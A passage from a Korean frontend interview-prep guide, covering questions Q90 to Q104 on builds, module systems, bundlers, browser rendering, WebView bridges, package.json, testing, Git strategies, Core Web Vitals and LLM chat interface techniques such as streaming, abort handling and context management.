<details><summary>📝 한 줄 요약</summary>1.1=순차·HOL 블로킹·헤더 반복 / 2=멀티플렉싱·헤더 압축(HPACK)·바이너리. 3=QUIC(UDP)로 TCP HOL까지 해결. 1.1 꼼수는 2에서 불필요.</details>

## Q90. 프로젝트 빌드와 배포가 무엇인가요? 🟡

**💬 30초 답변**
> 빌드(build)는 개발용 소스 코드(JSX·TS·Sass 등)를 브라우저가 이해하는 **최적화된 정적 파일(HTML/CSS/JS)로 변환**하는 과정이고, 배포(deploy)는 그 결과물을 **서버나 호스팅에 올려 사용자가 접근**할 수 있게 하는 과정입니다.

**📖 핵심 개념**

```
소스 코드(JSX/TS/Sass)
   │ 빌드 (트랜스파일·번들·압축·최적화)
   ▼
정적 산출물(dist/: index.html, app.[hash].js, style.css)
   │ 배포 (서버/CDN/호스팅 업로드)
   ▼
사용자 접근 (https://myapp.com)
```

📌 **빌드 단계에서 일어나는 일**
- **트랜스파일**: TS→JS, JSX→JS, 최신 문법→호환 문법(Babel/SWC)
- **번들링**: 여러 모듈을 묶음(Q92)
- **최적화**: minify(압축), 트리셰이킹, 코드 스플리팅, 해시 파일명(Q77)

📌 **배포 흐름 (CI/CD)**: 코드 푸시 → 자동 빌드 → 테스트 → 배포. GitHub Actions·Vercel 등이 자동화.

> 💡 개발 서버(`dev`)는 빠른 피드백(HMR)용이고, 빌드(`build`)는 프로덕션 최적화용. 둘의 목적이 다름. 정적 산출물은 CDN(Q76)에 올려 빠르게 제공.

**🔥 예상 꼬리질문**
- Q. CI/CD란? → A. 지속적 통합/배포. 코드 변경을 자동으로 빌드·테스트·배포해 안정적이고 빠른 릴리스를 보장.
- Q. 왜 빌드가 필요? → A. 브라우저가 TS/JSX를 모르고, 압축·최적화로 성능을 높이기 위해.

<details><summary>📝 한 줄 요약</summary>빌드=소스를 최적화된 정적 파일로 변환(트랜스파일·번들·압축), 배포=산출물을 호스팅에 올려 접근 가능하게. CI/CD로 자동화.</details>

## Q91. ES 모듈과 CommonJS 모듈의 차이점은 무엇인가요? 🔴

**💬 30초 답변**
> CommonJS(CJS)는 Node.js의 전통 모듈 시스템으로 `require`/`module.exports`를 쓰고 **런타임에 동기적으로** 모듈을 불러옵니다. ES 모듈(ESM)은 표준 모듈 시스템으로 `import`/`export`를 쓰고 **정적으로 분석**되어 트리셰이킹과 비동기 로딩이 가능합니다.

**📖 핵심 개념**

```js
// CommonJS (Node 전통)
const fs = require("fs");
module.exports = { foo };

// ES Module (표준)
import fs from "fs";
export { foo };
export default bar;
```

📌 **비교**

| 항목 | CommonJS | ES Module |
|------|----------|-----------|
| 문법 | `require`/`module.exports` | `import`/`export` |
| 로딩 | 런타임·동기 | 정적·비동기 가능 |
| 분석 시점 | 런타임 | **컴파일 타임(정적)** |
| 트리셰이킹 | 어려움 | **가능** (미사용 제거) |
| this(최상위) | `module.exports` | `undefined` |
| 환경 | Node 기본 | 브라우저·최신 Node 표준 |

🎯 **정적 분석의 이점**: ESM은 import 구조를 빌드 시 파악할 수 있어 **트리셰이킹**(안 쓰는 export 제거)으로 번들 크기를 줄입니다. CJS는 동적이라 어렵습니다.

> 💡 Node에서 ESM은 `.mjs` 또는 `package.json`의 `"type": "module"`로 활성화. 둘은 상호 운용에 제약이 있어(CJS에서 ESM을 require 불가 등) 혼용 시 주의. 번들러(Q92)가 이 차이를 흡수해줌.

**🔥 예상 꼬리질문**
- Q. 트리셰이킹이 ESM에서 잘 되는 이유? → A. import/export가 정적이라 빌드 시 사용 여부를 분석할 수 있어서.
- Q. `import`는 호이스팅되나요? → A. 선언이 최상단으로 끌어올려져 파일 어디서든 바인딩이 유효(정적).

<details><summary>📝 한 줄 요약</summary>CJS=require/module.exports·런타임 동기(Node 전통) / ESM=import/export·정적 분석(표준)→트리셰이킹·비동기 로딩 가능.</details>

## Q92. 번들러를 사용하는 이유는 무엇인가요? 🔴

**💬 30초 답변**
> 번들러는 여러 개로 나뉜 모듈·자원(JS·CSS·이미지)을 **의존성에 따라 하나(또는 몇 개)의 파일로 묶는** 도구입니다. HTTP 요청 수를 줄이고, 트랜스파일·압축·코드 스플리팅·트리셰이킹 같은 최적화를 수행해 로딩 성능을 높입니다.

**📖 핵심 개념**

```
입력: 수십~수백 개 모듈        번들러        출력: 최적화된 소수 파일
a.js, b.js, c.css, img...  ──(Webpack/Vite)──▶  app.[hash].js, vendor.js, style.css
                              의존성 그래프 분석
```

📌 **번들러가 하는 일**
- **모듈 통합**: import 그래프를 따라 묶음 → 요청 수 감소
- **트랜스파일**: TS/JSX/최신 문법 변환(Babel/SWC/esbuild 연계)
- **최적화**: minify, **트리셰이킹**(미사용 제거), **코드 스플리팅**(필요 시 분할 로드)
- **자원 처리**: CSS/이미지/폰트를 모듈로 다룸(loader/plugin)
- 개발 편의: HMR(코드 수정 즉시 반영), dev 서버

📌 **대표 번들러**

| 도구 | 특징 |
|------|------|
| **Webpack** | 강력·생태계 풍부, 설정 복잡 |
| **Vite** | esbuild+롤업, dev에서 빠름(네이티브 ESM) |
| **esbuild / Rollup / Turbopack** | 초고속 / 라이브러리용 / Next 차세대 |

> 💡 Vite가 빠른 이유: 개발 중엔 번들 없이 **브라우저 네이티브 ESM**으로 필요한 모듈만 즉시 제공(번들은 프로덕션 빌드에서만). HTTP/2(Q89)로 요청 수 부담이 줄며 "왜 번들?"의 답도 일부 변화 중.

**🔥 예상 꼬리질문**
- Q. 트리셰이킹/코드 스플리팅이란? → A. 트리셰이킹=미사용 코드 제거, 코드 스플리팅=번들을 쪼개 필요 시 동적 로드(초기 번들↓).
- Q. 번들러 vs 트랜스파일러? → A. 트랜스파일러(Babel)는 문법 변환, 번들러는 모듈 통합+최적화(트랜스파일도 포함 가능).

<details><summary>📝 한 줄 요약</summary>모듈/자원을 의존성 따라 묶는 도구(Webpack/Vite). 요청↓·트랜스파일·minify·트리셰이킹·코드 스플리팅·HMR. 성능과 개발 편의가 목적.</details>

## Q93. 브라우저 렌더링 과정을 단계별로 설명할 수 있나요? 🔴

**💬 30초 답변**
> HTML을 파싱해 **DOM**, CSS를 파싱해 **CSSOM**을 만들고, 둘을 합쳐 **렌더 트리**를 구성합니다. 이후 각 요소의 위치·크기를 계산하는 **레이아웃(Reflow)**, 픽셀을 칠하는 **페인트(Paint)**, 레이어를 합치는 **합성(Composite)** 순으로 화면에 그립니다.

**📖 핵심 개념**

```
HTML ──파싱──▶ DOM ─┐
                    ├─▶ 렌더 트리 ──▶ 레이아웃 ──▶ 페인트 ──▶ 합성 ──▶ 화면
CSS  ──파싱──▶ CSSOM┘   (보이는 것만)  (위치·크기)  (픽셀화)  (레이어)
```

📌 **단계**
1. **DOM 생성**: HTML 파싱 → 노드 트리
2. **CSSOM 생성**: CSS 파싱 → 스타일 트리 (CSS는 렌더 블로킹)
3. **렌더 트리**: DOM + CSSOM 결합, `display:none`은 제외(보이는 것만)
4. **레이아웃(Reflow)**: 각 노드의 좌표·크기 계산
5. **페인트(Paint)**: 색·텍스트·이미지 등 픽셀 칠하기
6. **합성(Composite)**: 레이어를 GPU로 합성해 최종 화면

📌 **성능 핵심 — Reflow vs Repaint**
- **Reflow(레이아웃)**: 크기·위치 변경(`width`, `top`, `font-size`) → 가장 비쌈
- **Repaint**: 색만 변경(`color`, `background`) → 레이아웃 생략, 덜 비쌈
- **합성만**: `transform`, `opacity` → 레이아웃·페인트 건너뜀 → **가장 저렴(60fps)** (Q30 연결)

```
transform/opacity 애니메이션 ✅  → 합성만, 부드러움
width/top/margin 애니메이션 ❌   → Reflow 유발, 끊김
```

> 💡 JS는 파싱을 막을 수 있음(동기 `<script>`) → `defer`/`async`로 완화. CSS는 CSSOM 완성까지 렌더 블로킹(Q87 네트워크 관점과 연결).

**🔥 예상 꼬리질문**
- Q. Reflow를 줄이는 법? → A. 레이아웃 속성 애니메이션 지양(transform 사용), DOM 변경 batch, 읽기/쓰기 분리(레이아웃 스래싱 방지).
- Q. transform이 빠른 이유? → A. 레이아웃·페인트를 건너뛰고 합성 단계에서 GPU로 처리하기 때문.

<details><summary>📝 한 줄 요약</summary>DOM+CSSOM→렌더 트리→레이아웃(Reflow)→페인트→합성. Reflow(위치·크기)가 가장 비쌈, transform/opacity는 합성만→60fps.</details>

## Q94. 하이브리드 앱에서 웹뷰와 앱이 소통하는 방법은? 🟢

**💬 30초 답변**
> 하이브리드 앱은 네이티브 앱 안에 웹페이지를 띄우는 **웹뷰(WebView)** 로 구성됩니다. 웹과 네이티브는 **브리지(bridge)** 를 통해 통신하는데, 웹→네이티브는 주입된 인터페이스(`window.ReactNativeWebView.postMessage` 등) 호출로, 네이티브→웹은 JS 코드 주입(`evaluateJavaScript`)으로 메시지를 주고받습니다.

**📖 핵심 개념**

```
┌─────────── 네이티브 앱 (iOS/Android) ───────────┐
│  ┌──────────── WebView ────────────┐            │
│  │   웹 페이지 (HTML/JS)            │            │
│  │      ▲   postMessage  │         │            │
│  │      │ (네→웹)    (웹→네)▼        │            │
│  └──────┼───────────────┼──────────┘            │
│      JS 주입         브리지 핸들러                │
└─────────────────────────────────────────────────┘
```

📌 **통신 방향**
- **웹 → 네이티브**: 웹이 브리지 객체로 메시지 전송
  - RN WebView: `window.ReactNativeWebView.postMessage(JSON.stringify(data))`
  - iOS: `webkit.messageHandlers.xxx.postMessage`, Android: `Android.method()`(`@JavascriptInterface`)
- **네이티브 → 웹**: 네이티브가 웹뷰에 JS 실행
  - `webView.evaluateJavascript(...)` / `injectJavaScript`

📌 **주고받는 것**: 카메라·푸시·생체인증 등 네이티브 기능 요청, 로그인 토큰 공유, 화면 전환 등.

> ⚠️ 보안: 브리지로 들어온 데이터는 신뢰하지 말고 검증. 임의 JS 실행/민감 기능 노출은 화이트리스트로 제한. 통신은 보통 **JSON 문자열** + 약속된 타입/액션 규약.

**🔥 예상 꼬리질문**
- Q. postMessage의 데이터 형식은? → A. 보통 문자열만 가능 → JSON.stringify로 직렬화해 주고받음.
- Q. 하이브리드의 장단점? → A. 웹 코드 재사용·빠른 배포 vs 네이티브 대비 성능·UX 제약.

<details><summary>📝 한 줄 요약</summary>웹뷰 안 웹↔네이티브를 브리지로 통신. 웹→네=postMessage(브리지 객체), 네→웹=JS 주입(evaluateJavascript). JSON 직렬화·검증 필수.</details>

## Q95. package.json 파일의 주요 필드와 역할을 설명할 수 있나요? 🟡

**💬 30초 답변**
> package.json은 프로젝트의 **메타데이터와 의존성·스크립트를 정의하는 매니페스트** 파일입니다. 패키지 이름·버전, 실행 스크립트, 운영/개발 의존성, 진입점 등을 기술해 npm/yarn이 프로젝트를 관리합니다.

**📖 핵심 개념**

```json
{
  "name": "my-app",
  "version": "1.0.0",
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "test": "vitest"
  },
  "dependencies": { "react": "^18.3.0" },
  "devDependencies": { "vite": "^5.0.0", "typescript": "^5.4.0" },
  "engines": { "node": ">=18" }
}
```

📌 **주요 필드**

| 필드 | 역할 |
|------|------|
| `name` / `version` | 패키지 이름·버전(시맨틱 버저닝) |
| `scripts` | `npm run <name>`으로 실행할 명령 |
| `dependencies` | **런타임**에 필요한 의존성(배포 포함) |
| `devDependencies` | **개발·빌드**에만 필요(테스트·번들러 등) |
| `type` | `module`이면 ESM(Q91) |
| `main`/`exports` | 패키지 진입점 |
| `engines` | Node 버전 등 요구 환경 |

📌 **시맨틱 버저닝 + 범위**: `MAJOR.MINOR.PATCH`. `^1.2.3`=MINOR까지 허용, `~1.2.3`=PATCH까지. `package-lock.json`이 실제 설치 버전을 고정해 재현성 보장.

> 💡 dependencies vs devDependencies 구분이 면접 포인트: 프로덕션 번들/실행에 필요하면 dependencies, 빌드·테스트·린트 등 개발에만 쓰면 devDependencies.

**🔥 예상 꼬리질문**
- Q. `^`와 `~` 차이? → A. `^1.2.3`은 1.x.x 내 최신(MINOR 허용), `~1.2.3`은 1.2.x 내 최신(PATCH만).
- Q. package-lock.json 역할? → A. 의존성 트리의 정확한 버전을 고정해 어디서든 동일하게 설치(재현성).

<details><summary>📝 한 줄 요약</summary>프로젝트 매니페스트(메타·의존성·스크립트). dependencies(런타임) vs devDependencies(개발). 시맨틱 버저닝 ^/~, lock 파일로 버전 고정.</details>

## Q96. 크로스 브라우징이란 무엇인가요? 🟡

**💬 30초 답변**
> 크로스 브라우징은 Chrome·Safari·Firefox·Edge 등 **여러 브라우저와 환경에서 웹사이트가 일관되게 동작·표시되도록** 만드는 작업입니다. 브라우저마다 렌더링 엔진·지원 기능이 달라, 표준 준수·폴리필·벤더 프리픽스·테스트로 호환성을 확보합니다.

**📖 핵심 개념**

📌 **왜 필요한가**: 브라우저마다 엔진(Blink, WebKit, Gecko)·CSS/JS 기능 지원·기본 스타일이 달라 같은 코드도 다르게 보일 수 있음.

📌 **대응 방법**
- **웹 표준 준수**: 시맨틱·유효한 마크업(Q5)
- **CSS 리셋/노멀라이즈**: 브라우저 기본 스타일 차이 제거
- **벤더 프리픽스**: `-webkit-`, `-moz-` → **autoprefixer**로 자동화
- **폴리필(polyfill)**: 미지원 기능을 JS로 구현(core-js 등)
- **기능 감지**: `@supports`(Q33), `if ('IntersectionObserver' in window)`
- **트랜스파일**: Babel로 최신 문법을 호환 문법으로(Browserslist 기준)
- **테스트**: BrowserStack·Playwright로 멀티 브라우저 검증

```
❌ 특정 브라우저만 보고 개발 → 사파리에서 깨짐
✅ Browserslist로 타깃 정의 → autoprefixer/Babel 자동 대응 + 크로스 테스트
```

> 💡 **점진적 향상 vs 우아한 저하**: 기본 기능은 모두에게 보장하고(점진적 향상), 최신 브라우저엔 향상된 경험 추가. `@supports`·폴리필이 그 수단.

**🔥 예상 꼬리질문**
- Q. 폴리필과 트랜스파일 차이? → A. 트랜스파일은 문법 변환(화살표 함수→function), 폴리필은 없는 API 구현(Promise, fetch 등).
- Q. Browserslist란? → A. 지원 대상 브라우저를 정의하는 설정 → autoprefixer/Babel이 이를 기준으로 동작.

<details><summary>📝 한 줄 요약</summary>여러 브라우저에서 일관 동작하게 만드는 작업. 표준 준수·리셋·autoprefixer·폴리필·기능 감지(@supports)·Babel·멀티 브라우저 테스트.</details>

## Q97. 프런트엔드에서 사용하는 TDD 기법을 설명할 수 있나요? 🟡

**💬 30초 답변**
> TDD(Test-Driven Development)는 **테스트를 먼저 작성한 뒤 그 테스트를 통과하는 코드를 구현**하는 방법론입니다. Red(실패하는 테스트) → Green(통과하는 최소 구현) → Refactor(개선) 사이클을 반복하며, 프론트엔드에서는 Jest/Vitest + React Testing Library로 적용합니다.

**📖 핵심 개념**

```
🔴 Red      실패하는 테스트 먼저 작성 (아직 구현 X)
🟢 Green    테스트를 통과하는 최소한의 코드 구현
🔵 Refactor 테스트를 유지하며 코드 개선
   ↺ 반복
```

```jsx
// React Testing Library 예시 (사용자 관점 테스트)
test("버튼 클릭 시 카운트 증가", async () => {
  render(<Counter />);
  await userEvent.click(screen.getByRole("button", { name: /증가/ }));
  expect(screen.getByText("1")).toBeInTheDocument();
});
```

📌 **프론트엔드 테스트 종류**

| 종류 | 대상 | 도구 |
|------|------|------|
| 단위(Unit) | 함수·훅·컴포넌트 | Jest, Vitest |
| 통합(Integration) | 컴포넌트 상호작용 | RTL |
| E2E | 실제 브라우저 시나리오 | Playwright, Cypress |

📌 **RTL 철학**: "구현이 아니라 **사용자가 보는 것**을 테스트하라" → `getByRole`/`getByText`로 접근성 기반 쿼리, 내부 state가 아닌 화면 결과 검증.

> 💡 TDD 장점: 회귀 방지, 설계 개선(테스트 가능한 구조), 리팩토링 안전망, 문서 역할. 단점: 초기 작성 비용·러닝 커브. 프론트는 UI 변화가 잦아 **핵심 로직·공통 컴포넌트 위주**로 적용하는 게 현실적.

**🔥 예상 꼬리질문**
- Q. RTL이 enzyme과 다른 점? → A. 내부 구현(state/instance)이 아닌 사용자 관점(DOM·접근성)으로 테스트해 견고함.
- Q. 무엇을 테스트하나요? → A. 사용자 행동·결과(클릭→화면 변화), 비즈니스 로직·엣지 케이스. 구현 세부는 지양.

<details><summary>📝 한 줄 요약</summary>테스트 먼저 작성(Red→Green→Refactor). 프론트는 Jest/Vitest+RTL(사용자 관점 쿼리)·Playwright(E2E). 회귀 방지·설계 개선이 이점.</details>

## Q98. 깃플로는 무엇이며, 그 외의 버전 관리 전략은? 🟡

**💬 30초 답변**
> Git Flow는 `main`·`develop`·`feature`·`release`·`hotfix` 등 **역할이 정해진 브랜치**로 운영하는 전략입니다. 체계적이지만 복잡해, 요즘은 더 단순한 GitHub Flow나 Trunk-Based Development를 CI/CD 환경에서 많이 씁니다.

**📖 핵심 개념**

📌 **Git Flow** — 브랜치 역할 분리
```
main      ──●─────────────●──  (배포된 안정 버전, 태그)
develop   ──●──●──●──●──●───   (통합 개발)
feature        └─┘            (기능 개발 → develop 병합)
release           └──┘        (출시 준비)
hotfix    ────────────└─┘     (긴급 수정 → main+develop)
```
- 장점: 체계적, 대규모·릴리스 주기가 명확한 제품에 적합
- 단점: 브랜치 많고 복잡, 잦은 배포(CD)엔 무거움

📌 **다른 전략**

| 전략 | 특징 |
|------|------|
| **GitHub Flow** | `main` + `feature` 브랜치 → PR → 머지 → 즉시 배포. 단순, CD 친화 |
| **GitLab Flow** | GitHub Flow + 환경(staging/production) 브랜치 |
| **Trunk-Based** | 짧은 브랜치/직접 main 커밋 + 피처 플래그. 매우 빈번한 통합 |

> 💡 선택 기준: **릴리스 주기**와 **팀 규모**. 정기 릴리스·대규모면 Git Flow, 지속 배포·작은 팀이면 GitHub Flow/Trunk-Based. 요즘 웹 서비스는 후자가 대세.

**🔥 예상 꼬리질문**
- Q. feature 브랜치를 짧게 유지하는 이유? → A. 오래 두면 머지 충돌·통합 지옥 → 작게 자주 병합(Trunk-Based 철학).
- Q. 피처 플래그란? → A. 코드를 배포하되 기능을 플래그로 on/off → main에 자주 머지하면서도 미완성 기능을 숨김.

<details><summary>📝 한 줄 요약</summary>Git Flow=main/develop/feature/release/hotfix 역할 분리(체계적·복잡). 대안=GitHub Flow(단순·CD), Trunk-Based(피처 플래그). 릴리스 주기·팀 규모로 선택.</details>

## Q99. 구글의 코어 웹 바이탈이란 무엇인가요? 🔴

**💬 30초 답변**
> 코어 웹 바이탈(Core Web Vitals)은 구글이 정의한 **사용자 경험 핵심 성능 지표**로, 로딩(LCP)·상호작용(INP)·시각 안정성(CLS) 세 가지입니다. 검색 랭킹에도 반영되어 프론트엔드 성능 최적화의 공식 기준이 됩니다.

**📖 핵심 개념**

📌 **3대 지표**

| 지표 | 측정 | 좋음 기준 | 의미 |
|------|------|-----------|------|
| **LCP** (Largest Contentful Paint) | 가장 큰 요소 렌더 시점 | ≤ 2.5s | 로딩 체감 속도 |
| **INP** (Interaction to Next Paint) | 상호작용 응답성 | ≤ 200ms | 클릭/입력 반응(2024년 FID 대체) |
| **CLS** (Cumulative Layout Shift) | 레이아웃 이동량 | ≤ 0.1 | 시각적 안정성(밀림) |

📌 **개선 방법**
- **LCP**: 핵심 이미지 preload/`priority`(Q69), 서버 응답 단축(SSR/CDN), 렌더 블로킹 제거
- **INP**: 무거운 JS 분할, 메인 스레드 점유 축소, 디바운싱/스로틀(Q53), 동시성(Q61)
- **CLS**: 이미지·광고·임베드에 **크기 예약**(width/height), 폰트 swap, 동적 삽입 콘텐츠 자리 확보

```
CLS 나쁨 ❌: 이미지가 늦게 로드되며 아래 텍스트를 밀어냄
CLS 좋음 ✅: width/height로 공간 미리 확보 → 안 밀림
```

> 💡 측정: Lighthouse(랩 데이터), PageSpeed Insights, **CrUX(실사용자 데이터)**, `web-vitals` 라이브러리. 랩과 실측(필드)을 함께 봐야 정확. FID는 2024년 3월 INP로 대체됨.

**🔥 예상 꼬리질문**
- Q. FID와 INP 차이? → A. FID는 첫 입력 지연만, INP는 전체 상호작용의 응답성을 측정(더 포괄적). INP가 FID를 대체.
- Q. CLS를 어떻게 막나요? → A. 이미지/광고 영역 크기 사전 지정, 폰트 로딩 전략, 콘텐츠 동적 삽입 시 자리 예약.

<details><summary>📝 한 줄 요약</summary>구글 UX 성능 지표 3종: LCP(로딩≤2.5s)·INP(반응성≤200ms, FID 대체)·CLS(안정성≤0.1). 검색 랭킹 반영. preload·JS 분할·크기 예약으로 개선.</details>

## Q100. LLM의 응답 지연 문제를 사용자 경험 측면에서 어떻게 해결할 수 있나요? 🔴

**💬 30초 답변**
> LLM은 응답 생성에 수 초가 걸리므로, **스트리밍(streaming)** 으로 생성되는 토큰을 실시간으로 보여주는 게 핵심입니다. 여기에 로딩 인디케이터(타이핑 효과·스켈레톤), 낙관적 UI, 중단 버튼(Q102)을 더해 체감 대기 시간을 줄입니다.

**📖 핵심 개념**

📌 **체감 지연 줄이기 (UX 전략)**
- **스트리밍 출력**: 완성을 기다리지 않고 토큰을 즉시 표시(SSE/ReadableStream — Q107, Q108) → 첫 글자까지 시간(TTFT)이 짧게 느껴짐
- **즉각 피드백**: 전송 즉시 타이핑 인디케이터(`●●●`)·스켈레톤 표시
- **점진적 렌더**: 마크다운/코드 블록을 받는 즉시 부분 렌더
- **중단·재생성**: 길어지면 멈추거나 다시 시도(Q102)
- **낙관적 UI**: 사용자 메시지는 전송 즉시 화면에 반영

```
❌ 다 만들 때까지 빈 화면 (수 초 침묵) → 느리게 느낌
✅ 토큰 스트리밍 → 글자가 즉시 흐르기 시작 → 빠르게 느낌
```

🎯 **핵심**: 실제 속도는 못 바꿔도 **체감 속도**를 바꾼다. 첫 반응을 빨리 보여주는 것(TTFT 최소화)이 LLM UX의 1원칙.

> 💡 추가: 응답 캐싱(같은 질문), 프롬프트 최적화로 실제 지연도 단축. 스트리밍 중에도 자동 스크롤·복사 버튼 등 인터랙션 제공.

**🔥 예상 꼬리질문**
- Q. 스트리밍이 왜 UX에 좋은가요? → A. 전체 완성을 안 기다리고 첫 토큰부터 보여줘 대기 체감이 크게 줄어듦.
- Q. TTFT란? → A. Time To First Token. 첫 토큰까지 걸리는 시간 — LLM 체감 속도의 핵심 지표.

<details><summary>📝 한 줄 요약</summary>스트리밍으로 토큰 즉시 표시(TTFT 최소화)가 핵심 + 타이핑 인디케이터·점진 렌더·낙관적 UI·중단. 체감 속도를 바꾼다.</details>

## Q101. AI 환각으로 잘못 만든 UI 컴포넌트 렌더링을 방지하는 방안은? 🟡

**💬 30초 답변**
> AI가 생성한 데이터/코드는 신뢰할 수 없으므로, 렌더링 전에 **스키마 검증**(zod 등)으로 구조를 확인하고, 검증 실패 시 폴백 UI를 보여주며, **에러 바운더리**로 렌더 크래시를 격리합니다. 절대 검증 없이 동적 렌더하거나 코드를 실행하지 않는 게 원칙입니다.

**📖 핵심 개념**

📌 **방어 계층**
1. **출력 구조 강제**: 모델에 JSON 스키마/structured output 요구
2. **스키마 검증**: 받은 데이터를 zod/yup로 파싱 → 형식 불일치면 거부
```ts
const Card = z.object({ title: z.string(), items: z.array(z.string()) });
const result = Card.safeParse(aiResponse);
if (!result.success) return <Fallback />;   // 환각/형식 오류 → 폴백
```
3. **허용 목록(allowlist)**: 렌더 가능한 컴포넌트·속성만 매핑(임의 컴포넌트/HTML 금지)
4. **에러 바운더리**(Q62): 렌더 중 터져도 앱 전체 크래시 방지
5. **새니타이즈**: AI가 만든 HTML은 DOMPurify로 정화(XSS 차단 — Q80)
6. **코드 실행 금지/격리**: 직접 eval 금지, 필요하면 샌드박스(iframe)

```
AI 출력 → 스키마 검증 → (실패) 폴백 UI
                      → (성공) 허용된 컴포넌트만 매핑 → 에러 바운더리로 감싸 렌더
```

> 💡 핵심 사고: "**AI 출력 = 신뢰 불가 입력(untrusted)**"으로 취급. 사용자 입력을 검증하듯 AI 응답도 검증·새니타이즈·격리.

**🔥 예상 꼬리질문**
- Q. structured output이란? → A. 모델이 정해진 JSON 스키마를 따르도록 강제하는 기능 → 파싱 안정성↑(그래도 검증은 필요).
- Q. AI가 만든 HTML을 그대로 넣으면? → A. XSS 위험 → DOMPurify로 새니타이즈 후 삽입.

<details><summary>📝 한 줄 요약</summary>AI 출력=신뢰 불가 입력. 스키마 검증(zod)→실패 시 폴백, 허용 컴포넌트만 매핑, 에러 바운더리 격리, HTML 새니타이즈, 코드 직접 실행 금지.</details>

## Q102. 생성형 AI 채팅 UI에서 중단 기능을 구현한다면? 🔴

**💬 30초 답변**
> `fetch`의 **AbortController**를 사용합니다. 요청 시 `signal`을 전달하고, 중단 버튼 클릭 시 `controller.abort()`를 호출하면 진행 중인 스트리밍 요청이 취소됩니다. 이미 받은 부분 응답은 화면에 유지하고 상태를 정리합니다.

**📖 핵심 개념**

```jsx
function Chat() {
  const controllerRef = useRef(null);

  async function send(prompt) {
    const controller = new AbortController();
    controllerRef.current = controller;
    try {
      const res = await fetch("/api/chat", {
        method: "POST",
        body: JSON.stringify({ prompt }),
        signal: controller.signal,          // ← 중단 연결
      });
      const reader = res.body.getReader();   // 스트리밍 읽기 (Q108)
      // ... 토큰 누적 렌더
    } catch (e) {
      if (e.name === "AbortError") {/* 사용자가 중단 — 정상 처리 */}
      else throw e;
    }
  }

  function stop() { controllerRef.current?.abort(); }  // 중단 버튼
}
```

📌 **포인트**
- `AbortController` + `signal`을 fetch에 전달
- `abort()` 호출 시 `AbortError` 발생 → catch에서 **정상 흐름으로** 처리(에러 표시 X)
- 받은 부분 텍스트는 유지, 로딩 상태·reader 정리
- 서버도 연결 종료를 감지해 LLM 생성을 멈추면 **토큰 비용 절감**

```
사용자 "중단" 클릭 → controller.abort() → fetch 취소 → AbortError → 정리
```

> 💡 SSE를 `EventSource`로 쓰면 `eventSource.close()`로 중단. 단 `EventSource`는 POST·헤더 제약이 있어, LLM 채팅은 보통 **fetch + ReadableStream + AbortController** 조합을 씀(Q107, Q108).

**🔥 예상 꼬리질문**
- Q. AbortError를 에러로 표시하면? → A. 사용자가 의도한 중단이므로 에러 UI 대신 정상 종료로 처리해야 함.
- Q. 서버 측 비용은? → A. 클라가 끊어도 서버가 계속 생성하면 토큰이 낭비됨 → 서버가 연결 종료(abort) 감지해 생성 중단.

<details><summary>📝 한 줄 요약</summary>AbortController의 signal을 fetch에 전달, 중단 버튼에서 abort() 호출 → AbortError를 정상 처리. 부분 응답 유지, 서버도 생성 중단해 비용 절감.</details>

## Q103. 길게 대화할 때 토큰 소모를 줄이는 컨텍스트 관리 전략은? 🟡

**💬 30초 답변**
> 대화가 길어질수록 매 요청에 전체 히스토리를 보내 토큰이 폭증합니다. 이를 막기 위해 **오래된 메시지 요약(summarization), 슬라이딩 윈도우(최근 N개만), 관련 메시지만 선별(RAG), 토큰 수 기반 절단** 같은 전략으로 컨텍스트를 압축합니다.

**📖 핵심 개념**

📌 **전략**

| 전략 | 방식 |
|------|------|
| **슬라이딩 윈도우** | 최근 N개 메시지만 전송(오래된 건 제외) |
| **요약(summarization)** | 이전 대화를 요약문으로 압축해 대체 |
| **선별(retrieval)** | 현재 질문과 관련된 메시지만 검색해 포함(RAG식) |
| **토큰 버짓 절단** | 토큰 한도 내에서 뒤에서부터 채우고 초과분 제거 |
| **시스템 프롬프트 최소화** | 중복·장황한 지시 제거 |

```
전체 히스토리 전송 (토큰 폭증) ❌
   메시지1...메시지50 전부 매번 전송

압축 전략 ✅
   [요약: 1~40 핵심] + [최근 41~50 원문]  → 토큰 대폭 절감
```

📌 **프론트엔드 역할**
- 메시지 히스토리 상태 관리, **토큰 수 추정**(tiktoken류)으로 한도 관리
- 요약 트리거 시점 결정(예: N개/토큰 초과 시 백엔드에 요약 요청)
- 불필요한 재전송 방지, 캐싱

> 💡 핵심 균형: **토큰 절감 ↔ 맥락 손실**. 너무 줄이면 AI가 앞 대화를 잊음. 최근 원문 + 과거 요약의 하이브리드가 실무적. 컨텍스트 윈도우 한계도 고려.

**🔥 예상 꼬리질문**
- Q. 요약의 위험은? → A. 정보 손실 → 중요한 디테일이 사라질 수 있어 최근 원문은 보존하는 하이브리드가 안전.
- Q. 프론트에서 토큰을 어떻게 세나요? → A. tiktoken 같은 토크나이저로 추정해 윈도우/절단 시점 판단.

<details><summary>📝 한 줄 요약</summary>긴 대화=토큰 폭증. 슬라이딩 윈도우(최근 N개)·과거 요약·관련 메시지 선별·토큰 절단으로 압축. 절감↔맥락 손실 균형(최근 원문+과거 요약).</details>

## Q104. RAG 구조에서 프런트엔드 개발자의 역할은? 🟢

**💬 30초 답변**
> RAG(Retrieval-Augmented Generation)는 외부 지식을 검색해 LLM 답변에 활용하는 구조입니다. 프론트엔드는 직접 검색·임베딩을 하진 않지만, **질의 입력 UX, 검색된 출처(citation) 표시, 스트리밍 답변 렌더, 신뢰성 제공(근거 링크), 피드백 수집**을 담당합니다.

**📖 핵심 개념**

```
[사용자 질문] ─FE─▶ 백엔드
                    │ 1. 질문 임베딩 → 벡터 DB 검색(관련 문서 retrieve)
                    │ 2. 검색 문서 + 질문을 LLM에 전달(augment)
                    │ 3. LLM 답변 생성(generate)
[답변 + 출처] ◀─FE─ 스트리밍
```

📌 **프론트엔드 역할**
- **질의 UX**: 검색/질문 입력, 필터, 자동완성
- **출처 표시(citation)**: 답변 근거 문서·링크를 함께 노출 → **환각 신뢰성 보완**
- **스트리밍 렌더**: 답변을 토큰 단위로(Q100, Q108)
- **인용 하이라이트**: 어느 문서의 어느 부분인지 매핑 표시
- **로딩 단계 표시**: "문서 검색 중 → 답변 생성 중" 진행 상태
- **피드백 수집**: 👍/👎로 검색·답변 품질 개선 루프
- **권한·필터**: 사용자가 접근 가능한 문서만 질의에 반영

> 💡 면접 포인트: RAG에서 프론트의 가치는 "**답변의 신뢰성을 사용자에게 전달**"하는 것 — 출처 표기·인용 하이라이트로 환각을 사용자가 검증 가능하게 만드는 것이 핵심 기여.

**🔥 예상 꼬리질문**
